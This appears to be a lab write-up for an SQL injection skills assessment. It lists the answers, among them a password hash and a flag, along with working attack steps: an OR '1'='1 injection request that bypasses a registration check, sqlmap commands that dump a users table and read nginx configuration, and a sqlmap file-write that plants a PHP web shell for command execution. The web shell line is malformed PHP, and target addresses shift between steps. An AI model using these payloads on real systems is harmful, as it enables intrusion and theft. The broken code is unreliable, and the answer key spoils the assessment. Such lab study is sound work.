# Skills Assessment - SQL Injection Fundamentals
## Questions
1. What is the password hash for the user 'admin'? **Answer:528d6d9cedc2c7aab146ef226e918396**
   - SQLi in the `invitationCode` in registration form which let us bypass the invitation code check:
        ```
        POST /api/register.php HTTP/1.1
        Host: 154.57.164.79:31275
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 105

        username=123&password=Hacked123%21&repeatPassword=Hacked123%21&invitationCode=abcd-efgh-1234'+OR+'1'%3d'1
        ```
   - Log in with the new account `123`:`Hacked123!`, found that this endpoint also is vulnerable to SQLi at parameter `q`, run this through `sqlmap` to dump the `chattr.Users` table:
        ```shellsession
        $ sqlmap -u 'https://154.57.164.66:31789/index.php?q=123*&u=1' --cookie 'PHPSESSID=825dk48h4c914kuqpk2mu73l0l' --batch --threads 10 -D chattr -T Users --dump
        ```
2. What is the root path of the web application? **Answer:/var/www/chattr-prod**
   - The web server is nginx, so try to read nginx config files → find the web root in the default site config:
        ```shellsession
        $ sqlmap -u 'https://154.57.164.66:31789/index.php?q=123*&u=1' --cookie 'PHPSESSID=825dk48h4c914kuqpk2mu73l0l' --batch --threads 10 --file-read '/etc/nginx/sites-enabled/default'
        <SNIP>
        files saved to [1]:
        [*] /home/htb-ac-1863259/.local/share/sqlmap/output/154.57.164.66/files/_etc_nginx_sites-enabled_default (same file)
        <SNIP>
        $ cat /home/htb-ac-1863259/.local/share/sqlmap/output/154.57.164.66/files/_etc_nginx_sites-enabled_default
        server {
            listen 443 ssl;
            server_name chattr.htb;
            ssl_password_file /root/chattr.key.pass;
            ssl_certificate /etc/ssl/certs/chattr.crt;
            ssl_certificate_key /etc/ssl/private/chattr.key;
            ssl_protocols TLSv1.2 TLSv1.3;
            ssl_ciphers HIGH:!aNULL:!MD5;

            root /var/www/chattr-prod;

            location / {
                index index.php;
                try_files $uri $uri/ /index.php?$query_string;
            }

            location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php8.2-fpm.sock;
            }

            location ^~ /includes/ {
                deny all;
            }
        ```
3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below. **Answer:061b1aeb94dec6bf5d9c27032b3c1d8d**
   - Write a web shell to the web root with sqlmap:
        ```shellsession
        $ echo "<?php system['\$_GET['cmd]];/>" >  shell.php
        $ sqlmap -u 'https://154.57.164.66:31789/index.php?q=123*&u=1' --cookie 'PHPSESSID=825dk48h4c914kuqpk2mu73l0l' --batch --threads 10 --file-write=shell.php --file-dest='/var/www/chattr-prod/shell.php'
        ```
   - Access the web shell and read the flag: https://154.57.164.79:31275/shell.php?cmd=cat+/flag*